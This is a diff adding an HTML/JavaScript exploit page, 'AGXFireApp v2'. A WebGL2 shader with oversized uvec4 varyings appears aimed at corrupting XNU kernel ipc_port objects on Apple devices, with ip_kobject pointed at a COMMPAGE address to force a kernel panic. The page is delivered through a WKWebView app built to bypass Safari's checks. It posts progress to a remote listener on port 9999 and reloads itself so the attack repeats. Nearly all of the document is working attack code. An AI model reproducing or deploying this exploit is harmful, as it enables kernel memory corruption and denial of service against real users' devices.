@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>body { background: #000; color: #0f0; font-family: monospace; font-size: 12px; padding: 8px; } #log { white-space: pre-wrap; }</style>
+</head>
+<body>
+<div id="log">AGXFireApp v2 — loading...</div>
+<canvas id="c"></canvas>
+<script>
+var logEl = document.getElementById('log');
+console.log = function() {
+    var msg = Array.from(arguments).join(' ');
+    logEl.textContent += msg + '\n';
+    logEl.scrollTop = logEl.scrollHeight;
+    try { window.webkit.messageHandlers.nexus.postMessage(msg); } catch(e) {}
+};
+</script>
+<script>
+/*
+ * AGXFireApp v2 — 12-uvec4 ASLR sweep, ipc_port/COMMPAGE target, io_refs=1
+ * =========================================================================
+ * Delivery: WKWebView in custom app — bypasses Safari WebGL security validation.
+ *
+ * Target: kalloc.192 ipc_port zone (AllocatorProbe_v15 holds 5000 ports)
+ * Overflow geometry: 12 named uvec4 varyings = 192 bytes/vertex = 49152B/instance
+ * ASLR sweep: O in {0, 64, 128} covered by v0/v4/v8
+ *
+ * ipc_port layout (XNU arm64, kalloc.192):
+ *   +0  io_bits    = 0x80000002  (IKOT_TASK | IO_ACTIVE)
+ *   +4  io_refs    = 1           io_refs drops 1→0 on mach_port_destroy
+ *                                → ipc_port_release → ipc_kobject_destroy
+ *                                → ip_kobject dispatch → kernel dereferences COMMPAGE_TARGET
+ *                                → PAN fault (EC=K) → qualifying kernel panic
+ *   +8  ip_kobject = 0x0000000FFFFFC330  (COMMPAGE_TARGET)
+ *
+ * MAX_FIRES=1, RELOAD_DELAY_MS=180000: one 80s GPU hang per 260s cycle < 180s watchdog.
+ * After cycle, sends RELOAD_NOW via postMessage — native app reloads WKWebView.
+ */
+var COMMPAGE_LO       = 0xFFFFC330;
+var COMMPAGE_HI       = 0x0000000F;
+var IO_BITS_IKOT_TASK = 2147483650;  // 0x80000002 = IKOT_TASK | IO_ACTIVE
+var IO_REFS_HEALTHY   = 1;           // io_refs=1: drops to 0 on destroy → PAN path
+var REPORT_HOST       = '192.168.68.109';
+var MAX_FIRES         = 1;
+var FIRE_INTERVAL_MS  = 500;
+var RELOAD_DELAY_MS   = 180000;
+
+function report(msg) {
+    console.log('[AGXFireApp_v2] ' + msg);
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'http://' + REPORT_HOST + ':9999/', false);
+        xhr.send('[AGXFireApp_v2] ' + msg);
+    } catch(e) {}
+}
+
+var gl = null;
+
+function initGL() {
+    var oc = document.createElement('canvas');
+    oc.width = 16; oc.height = 16;
+    document.body.appendChild(oc);
+    gl = oc.getContext('webgl2');
+    if (!gl) { report('NO_WEBGL2'); return false; }
+    var maxV = gl.getParameter(gl.MAX_VARYING_VECTORS);
+    report('MAX_VARYING_VECTORS=' + maxV);
+    if (maxV < 12) { report('ERR_VARYINGS need=12 got=' + maxV); return false; }
+
+    var lo = COMMPAGE_LO + 'u', hi = COMMPAGE_HI + 'u';
+    var io = IO_BITS_IKOT_TASK + 'u', rf = IO_REFS_HEALTHY + 'u', z = '0u';
+    var vsSrc = '#version 300 es\n' +
+        'flat out uvec4 v0,v1,v2,v3,v4,v5,v6,v7,v8,v9,v10,v11;\n' +
+        'void main() {\n' +
+        '    v0 =uvec4('+io+','+rf+','+lo+','+hi+');\n' +
+        '    v1 =uvec4('+z+','+z+','+z+','+z+');\n' +
+        '    v2 =uvec4('+z+','+z+','+z+','+z+');\n' +
+        '    v3 =uvec4('+z+','+z+','+z+','+z+');\n' +
+        '    v4 =uvec4('+io+','+rf+','+lo+','+hi+');\n' +
+        '    v5 =uvec4('+z+','+z+','+z+','+z+');\n' +
+        '    v6 =uvec4('+z+','+z+','+z+','+z+');\n' +
+        '    v7 =uvec4('+z+','+z+','+z+','+z+');\n' +
+        '    v8 =uvec4('+io+','+rf+','+lo+','+hi+');\n' +
+        '    v9 =uvec4('+z+','+z+','+z+','+z+');\n' +
+        '    v10=uvec4('+z+','+z+','+z+','+z+');\n' +
+        '    v11=uvec4('+z+','+z+','+z+','+z+');\n' +
+        '    gl_Position = vec4(0.0,0.0,0.0,1.0);\n' +
+        '    gl_PointSize = 1.0;\n' +
+        '}\n';
+    var fsSrc = '#version 300 es\nprecision highp float;\n' +
+        'flat in uvec4 v0,v1,v2,v3,v4,v5,v6,v7,v8,v9,v10,v11;\n' +
+        'out vec4 o;\nvoid main() {\n' +
+        '    o = vec4(float(v0.z)*0.0000001,0.0,0.0,1.0);\n}\n';
+
+    var vs = gl.createShader(gl.VERTEX_SHADER);
+    gl.shaderSource(vs, vsSrc); gl.compileShader(vs);
+    if (!gl.getShaderParameter(vs, gl.COMPILE_STATUS)) { report('VS_ERR '+gl.getShaderInfoLog(vs)); return false; }
+    var fs = gl.createShader(gl.FRAGMENT_SHADER);
+    gl.shaderSource(fs, fsSrc); gl.compileShader(fs);
+    if (!gl.getShaderParameter(fs, gl.COMPILE_STATUS)) { report('FS_ERR '+gl.getShaderInfoLog(fs)); return false; }
+    var prog = gl.createProgram();
+    gl.attachShader(prog, vs); gl.attachShader(prog, fs); gl.linkProgram(prog);
+    if (!gl.getProgramParameter(prog, gl.LINK_STATUS)) { report('LINK_ERR '+gl.getProgramInfoLog(prog)); return false; }
+    gl.useProgram(prog);
+    report('SHADER_OK 12uvec4 v2 sweep O={0,64,128} ipc_port ip_kobject=COMMPAGE io_refs=1');
+
+    var fbo = gl.createFramebuffer();
+    gl.bindFramebuffer(gl.FRAMEBUFFER, fbo);
+    var rtex = gl.createTexture();
+    gl.bindTexture(gl.TEXTURE_2D, rtex);
+    gl.texStorage2D(gl.TEXTURE_2D, 1, gl.RGBA8, 16, 16);
+    gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, rtex, 0);
+    gl.viewport(0, 0, 16, 16);
+    return true;
+}
+
+function fireOnce(fireNum) {
+    if (!gl || gl.isContextLost()) { report('GL_LOST fire='+fireNum); return; }
+    var t0 = performance.now();
+    gl.drawArraysInstanced(gl.POINTS, 0, 256, 16777217);
+    try { gl.drawArraysInstanced(gl.POINTS, 0, 1024, 4194305); } catch(e) {}
+    gl.flush();
+    var dt = (performance.now()-t0).toFixed(1);
+    try {
+        var px = new Uint8Array(4);
+        gl.readPixels(8,8,1,1,gl.RGBA,gl.UNSIGNED_BYTE,px);
+        report('FIRE_DONE fire='+fireNum+' ms='+dt+' r='+px[0]+(px[0]>0?' SHADER_EXECUTED':' SHADER_NOT_EXECUTED'));
+    } catch(e) {
+        report('FIRE_DONE fire='+fireNum+' ms='+dt);
+    }
+}
+
+var fireCount = 0;
+function runFireLoop() {
+    fireOnce(fireCount); fireCount++;
+    if (fireCount < MAX_FIRES) {
+        setTimeout(runFireLoop, FIRE_INTERVAL_MS);
+    } else {
+        report('ALL_FIRES_DONE total='+fireCount+' waiting='+RELOAD_DELAY_MS+'ms for AllocatorProbe scan');
+        var secs = RELOAD_DELAY_MS / 1000;
+        var ct = setInterval(function(){ secs -= 30; if (secs > 0) report('RELOAD_IN '+secs+'s'); else clearInterval(ct); }, 30000);
+        setTimeout(function(){
+            report('RELOAD_NOW');
+            try { window.webkit.messageHandlers.nexus.postMessage('RELOAD_NOW'); } catch(e) {}
+        }, RELOAD_DELAY_MS);
+    }
+}
+
+if (initGL()) {
+    report('FIRING_START max='+MAX_FIRES+' interval='+FIRE_INTERVAL_MS+'ms 12uvec4+commpage+io_refs=1+wkwebview');
+    runFireLoop();
+}
+</script>
+</body>
+</html>
